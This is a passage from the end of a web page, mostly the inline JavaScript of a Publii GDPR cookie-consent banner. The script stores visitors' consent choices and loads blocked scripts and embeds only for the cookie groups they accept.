.99a1 1 0 0 1-.71-.3ZM9 13.5c0 .83-.67 1.5-1.5 1.5S6 14.33 6 13.5 6.67 12 7.5 12s1.5.67 1.5 1.5Zm3.25.81a.744.744 0 0 1-.06-1.05c.28-.32.75-.34 1.05-.06.31.28.33.75.05 1.06-.15.16-.35.25-.56.25-.18 0-.36-.06-.5-.19ZM8.68 7.26c.41.37.44 1 .07 1.41-.2.22-.47.33-.75.33a.96.96 0 0 1-.67-.26c-.41-.37-.44-1-.07-1.41.37-.42 1-.45 1.41-.08Zm11.48 1.88c.18-.19.52-.19.7 0 .05.04.09.1.11.16.03.06.04.12.04.19 0 .13-.05.26-.15.35-.09.1-.22.15-.35.15s-.26-.05-.35-.15a.355.355 0 0 1-.11-.16.433.433 0 0 1-.04-.19c0-.13.05-.26.15-.35Zm-4.93-1.86a.75.75 0 1 1 1.059-1.06.75.75 0 0 1-1.059 1.06Z"/></svg></button></div><script>(function(win) {
    if (!document.querySelector('.pcb')) {
        return;
    }

    var cbConfig = {
        behaviour: document.querySelector('.pcb').getAttribute('data-behaviour'),
        behaviourLink: document.querySelector('.pcb').getAttribute('data-behaviour-link'),
        revision: document.querySelector('.pcb').getAttribute('data-revision'),
        configTTL: parseInt(document.querySelector('.pcb').getAttribute('data-config-ttl'), 10),
        debugMode: document.querySelector('.pcb').getAttribute('data-debug-mode') === 'true',
        initialState: null,
        previouslyAccepted: []
    };

    var cbUI = {
        wrapper: document.querySelector('.pcb'),
        banner: {
            element: null,
            btnAccept: null,
            btnReject: null,
            btnConfigure: null
        },
        popup: {
            element: null,
            btnClose: null,
            btnSave: null,
            btnAccept: null,
            btnReject: null,
            checkboxes: null,
        },
        overlay: null,
        badge: null,
        blockedScripts: document.querySelectorAll('script[type^="gdpr-blocker/"]'),
        triggerLinks: cbConfig.behaviourLink ? document.querySelectorAll('a[href*="' + cbConfig.behaviourLink + '"]') : null
    };

    function initUI () {
        // setup banner elements
        cbUI.banner.element = cbUI.wrapper.querySelector('.pcb__banner');
        cbUI.banner.btnAccept = cbUI.banner.element.querySelector('.pcb__btn--accept');
        cbUI.banner.btnReject = cbUI.banner.element.querySelector('.pcb__btn--reject');
        cbUI.banner.btnConfigure = cbUI.banner.element.querySelector('.pcb__btn--configure');

        // setup popup elements
        if (cbUI.wrapper.querySelector('.pcb__popup')) {
            cbUI.popup.element = cbUI.wrapper.querySelector('.pcb__popup');
            cbUI.popup.btnClose = cbUI.wrapper.querySelector('.pcb__popup__close');
            cbUI.popup.btnSave = cbUI.popup.element.querySelector('.pcb__btn--save');
            cbUI.popup.btnAccept = cbUI.popup.element.querySelector('.pcb__btn--accept');
            cbUI.popup.btnReject = cbUI.popup.element.querySelector('.pcb__btn--reject');
            cbUI.popup.checkboxes = cbUI.popup.element.querySelector('input[type="checkbox"]');
            // setup overlay
            cbUI.overlay = cbUI.wrapper.querySelector('.pcb__overlay');
        }

        cbUI.badge = cbUI.wrapper.querySelector('.pcb__badge');

        if (cbConfig.behaviour.indexOf('link') > -1) {
            for (var i = 0; i < cbUI.triggerLinks.length; i++) {
                cbUI.triggerLinks[i].addEventListener('click', function(e) {
                    e.preventDefault();
                    showBannerOrPopup();
                });
            }
        }
    }

    function initState () {
        var lsKeyName = getConfigName();
        var currentConfig = localStorage.getItem(lsKeyName);
        var configIsFresh = checkIfConfigIsFresh();

        if (!configIsFresh || currentConfig === null) {
            if (cbConfig.debugMode) {
                console.log('🍪 Config not found, or configuration expired');
            }

            showBanner();
        } else if (typeof currentConfig === 'string') {
            if (cbConfig.debugMode) {
                console.log('🍪 Config founded');
            }

            showBadge();

            if (cbUI.popup.element) {
                var allowedGroups = currentConfig.split(',');
                var checkedCheckboxes = cbUI.popup.element.querySelectorAll('input[type="checkbox"]:checked');

                for (var j = 0; j < checkedCheckboxes.length; j++) {
                    var name = checkedCheckboxes[j].getAttribute('data-group-name');

                    if (name && name !== '-' && allowedGroups.indexOf(name) === -1) {
                        checkedCheckboxes[j].checked = false;
                    }
                }

                for (var i = 0; i < allowedGroups.length; i++) {
                    var checkbox = cbUI.popup.element.querySelector('input[type="checkbox"][data-group-name="' + allowedGroups[i] + '"]');

                    if (checkbox) {
                        checkbox.checked = true;
                    }

                    allowCookieGroup(allowedGroups[i]);
                }
            }
        }

        setTimeout(function () {
            cbConfig.initialState = getInitialStateOfConsents();
        }, 0);
    }

    function checkIfConfigIsFresh () {
        var lastConfigSave = localStorage.getItem('publii-gdpr-cookies-config-save-date');

        if (lastConfigSave === null) {
            return false;
        }

        lastConfigSave = parseInt(lastConfigSave, 10);

        if (lastConfigSave === 0) {
            return true;
        }

        if (+new Date() - lastConfigSave < cbConfig.configTTL * 24 * 60 * 60 * 1000) {
            return true;
        }

        return false;
    }

    function initBannerEvents () {
        cbUI.banner.btnAccept.addEventListener('click', function (e) {
            e.preventDefault();
            acceptAllCookies('banner');
            showBadge();
        }, false);

        if (cbUI.banner.btnReject) {
            cbUI.banner.btnReject.addEventListener('click', function (e) {
                e.preventDefault();
                rejectAllCookies();
                showBadge();
            }, false);
        }

        if (cbUI.banner.btnConfigure) {
            cbUI.banner.btnConfigure.addEventListener('click', function (e) {
                e.preventDefault();
                hideBanner();
                showAdvancedPopup();
                showBadge();
            }, false);
        }
    }

    function initPopupEvents () {
        if (!cbUI.popup.element) {
            return;
        }

        cbUI.overlay.addEventListener('click', function (e) {
            hideAdvancedPopup();
        }, false);

        cbUI.popup.element.addEventListener('click', function (e) {
            e.stopPropagation();
        }, false);

        cbUI.popup.btnAccept.addEventListener('click', function (e) {
            e.preventDefault();
            acceptAllCookies('popup');
        }, false);

        cbUI.popup.btnReject.addEventListener('click', function (e) {
            e.preventDefault();
            rejectAllCookies();
        }, false);

        cbUI.popup.btnSave.addEventListener('click', function (e) {
            e.preventDefault();
            saveConfiguration();
        }, false);

        cbUI.popup.btnClose.addEventListener('click', function (e) {
            e.preventDefault();
            hideAdvancedPopup();
        }, false);
    }

    function initBadgeEvents () {
        if (!cbUI.badge) {
            return;
        }

        cbUI.badge.addEventListener('click', function (e) {
            showBannerOrPopup();
        }, false);
    }

    initUI();
    initState();
    initBannerEvents();
    initPopupEvents();
    initBadgeEvents();

    /**
     * API
     */
    function addScript (src, inline) {
        var newScript = document.createElement('script');

        if (src) {
            newScript.setAttribute('src', src);
        }

        if (inline) {
            newScript.text = inline;
        }

        document.body.appendChild(newScript);
    }

    function allowCookieGroup (allowedGroup) {
        var scripts = document.querySelectorAll('script[type="gdpr-blocker/' + allowedGroup + '"]');
        cbConfig.previouslyAccepted.push(allowedGroup);
    
        for (var j = 0; j < scripts.length; j++) {
            addScript(scripts[j].src, scripts[j].text);
        }

        var groupEvent = new Event('publii-cookie-banner-unblock-' + allowedGroup);
        document.body.dispatchEvent(groupEvent);
        unlockEmbeds(allowedGroup);

        if (cbConfig.debugMode) {
            console.log('🍪 Allowed group: ' + allowedGroup);
        }
    }

    function showBannerOrPopup () {
        if (cbUI.popup.element) {
            showAdvancedPopup();
        } else {
            showBanner();
        }
    }

    function showAdvancedPopup () {
        cbUI.popup.element.classList.add('is-visible');
        cbUI.overlay.classList.add('is-visible');
        cbUI.popup.element.setAttribute('aria-hidden', 'false');
        cbUI.overlay.setAttribute('aria-hidden', 'false');
    }

    function hideAdvancedPopup () {
        cbUI.popup.element.classList.remove('is-visible');
        cbUI.overlay.classList.remove('is-visible');
        cbUI.popup.element.setAttribute('aria-hidden', 'true');
        cbUI.overlay.setAttribute('aria-hidden', 'true');
    }

    function showBanner () {
        cbUI.banner.element.classList.add('is-visible');
        cbUI.banner.element.setAttribute('aria-hidden', 'false');
    }

    function hideBanner () {
        cbUI.banner.element.classList.remove('is-visible');
        cbUI.banner.element.setAttribute('aria-hidden', 'true');
    }

    function showBadge () {
        if (!cbUI.badge) {
            return;
        }

        cbUI.badge.classList.add('is-visible');
        cbUI.badge.setAttribute('aria-hidden', 'false');
    }

    function getConfigName () {
        var lsKeyName = 'publii-gdpr-allowed-cookies';

        if (cbConfig.revision) {
            lsKeyName = lsKeyName + '-v' + parseInt(cbConfig.revision, 10);
        }

        return lsKeyName;
    }

    function storeConfiguration (allowedGroups) {
        var lsKeyName = getConfigName();
        var dataToStore = allowedGroups.join(',');
        localStorage.setItem(lsKeyName, dataToStore);

        if (cbConfig.configTTL === 0) {
            localStorage.setItem('publii-gdpr-cookies-config-save-date', 0);

            if (cbConfig.debugMode) {
                console.log('🍪 Store never expiring configuration');
            }
        } else {
            localStorage.setItem('publii-gdpr-cookies-config-save-date', +new Date());
        }
    }

    function getInitialStateOfConsents () {
        if (!cbUI.popup.element) {
            return [];
        }

        var checkedGroups = cbUI.popup.element.querySelectorAll('input[type="checkbox"]:checked');
        var groups = [];

        for (var i = 0; i < checkedGroups.length; i++) {
            var allowedGroup = checkedGroups[i].getAttribute('data-group-name');

            if (allowedGroup !== '') {
                groups.push(allowedGroup);
            }
        }

        if (cbConfig.debugMode) {
            console.log('🍪 Initial state: ' + groups.join(', '));
        }

        return groups;
    }

    function getCurrentStateOfConsents () {
        if (!cbUI.popup.element) {
            return [];
        }

        var checkedGroups = cbUI.popup.element.querySelectorAll('input[type="checkbox"]:checked');
        var groups = [];

        for (var i = 0; i < checkedGroups.length; i++) {
            var allowedGroup = checkedGroups[i].getAttribute('data-group-name');

            if (allowedGroup !== '') {
                groups.push(allowedGroup);
            }
        }

        if (cbConfig.debugMode) {
            console.log('🍪 State to save: ' + groups.join(', '));
        }

        return groups;
    }

    function getAllGroups () {
        if (!cbUI.popup.element) {
            return [];
        }

        var checkedGroups = cbUI.popup.element.querySelectorAll('input[type="checkbox"]');
        var groups = [];

        for (var i = 0; i < checkedGroups.length; i++) {
            var allowedGroup = checkedGroups[i].getAttribute('data-group-name');

            if (allowedGroup !== '') {
                groups.push(allowedGroup);
            }
        }

        return groups;
    }

    function acceptAllCookies (source) {
        var groupsToAccept = getAllGroups();
        storeConfiguration(groupsToAccept);

        for (var i = 0; i < groupsToAccept.length; i++) {
            var group = groupsToAccept[i];

            if (cbConfig.initialState.indexOf(group) > -1 || cbConfig.previouslyAccepted.indexOf(group) > -1) {
                if (cbConfig.debugMode) {
                    console.log('🍪 Skip previously activated group: ' + group);
                }

                continue;
            }

            allowCookieGroup(group);
        }

        if (cbUI.popup.element) {
            var checkboxesToCheck = cbUI.popup.element.querySelectorAll('input[type="checkbox"]');

            for (var j = 0; j < checkboxesToCheck.length; j++) {
                checkboxesToCheck[j].checked = true;
            }
        }

        if (cbConfig.debugMode) {
            console.log('🍪 Accept all cookies: ', groupsToAccept.join(', '));
        }

        if (source === 'popup') {
            hideAdvancedPopup();
        } else if (source === 'banner') {
            hideBanner();
        }
    }

    function rejectAllCookies () {
        if (cbConfig.debugMode) {
            console.log('🍪 Reject all cookies');
        }

        storeConfiguration([]);
        setTimeout(function () {
            window.location.reload();
        }, 100);
    }

    function saveConfiguration () {
        var groupsToAccept = getCurrentStateOfConsents();
        storeConfiguration(groupsToAccept);

        if (cbConfig.debugMode) {
            console.log('🍪 Save new config: ', groupsToAccept.join(', '));
        }

        if (reloadIsNeeded(groupsToAccept)) {
            setTimeout(function () {
                window.location.reload();
            }, 100);
            return;
        }

        for (var i = 0; i < groupsToAccept.length; i++) {
            var group = groupsToAccept[i];

            if (cbConfig.initialState.indexOf(group) > -1 || cbConfig.previouslyAccepted.indexOf(group) > -1) {
                if (cbConfig.debugMode) {
                    console.log('🍪 Skip previously activated group: ' + group);
                }

                continue;
            }

            allowCookieGroup(group);
        }

        hideAdvancedPopup();
    }

    function reloadIsNeeded (groupsToAccept) {
        // check if user rejected consent for initial groups
        var initialGroups = cbConfig.initialState;
        var previouslyAcceptedGroups = cbConfig.previouslyAccepted;
        var groupsToCheck = initialGroups.concat(previouslyAcceptedGroups);

        for (var i = 0; i < groupsToCheck.length; i++) {
            var groupToCheck = groupsToCheck[i];

            if (groupsToAccept.indexOf(groupToCheck) === -1) {
                if (cbConfig.debugMode) {
                    console.log('🍪 Reload is needed due lack of: ', groupToCheck);
                }

                return true;
            }
        }

        return false;
    }

    function unlockEmbeds (cookieGroup) {
        var iframesToUnlock = document.querySelectorAll('.pec-wrapper[data-consent-group-id="' + cookieGroup + '"]');

        for (var i = 0; i < iframesToUnlock.length; i++) {
            var iframeWrapper = iframesToUnlock[i];
            iframeWrapper.querySelector('.pec-overlay').classList.remove('is-active');
            iframeWrapper.querySelector('.pec-overlay').setAttribute('aria-hidden', 'true');
            var iframe = iframeWrapper.querySelector('iframe');
            iframe.setAttribute('src', iframe.getAttribute('data-consent-src'));
        }
    }

    win.publiiEmbedConsentGiven = function (cookieGroup) {
        // it will unlock embeds
        allowCookieGroup(cookieGroup);

        var checkbox = cbUI.popup.element.querySelector('input[type="checkbox"][data-group-name="' + cookieGroup + '"]');

        if (checkbox) {
            checkbox.checked = true;
        }

        var groupsToAccept = getCurrentStateOfConsents();
        storeConfiguration(groupsToAccept);

        if (cbConfig.debugMode) {
            console.log('🍪 Save new config: ', groupsToAccept.join(', '));
        }
    }
})(window);</script></body></html>